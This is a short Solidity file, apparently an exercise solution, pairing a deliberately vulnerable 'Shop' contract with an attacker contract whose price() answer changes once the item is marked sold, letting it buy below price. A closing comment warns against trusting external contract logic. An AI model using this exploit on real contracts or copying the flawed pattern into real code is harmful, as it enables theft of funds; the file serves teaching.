// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Buyers {
    Shop public shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? 1 : 150;
    }

    function buy() public {
        shop.buy();
    }
}

/* 
Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.
 */
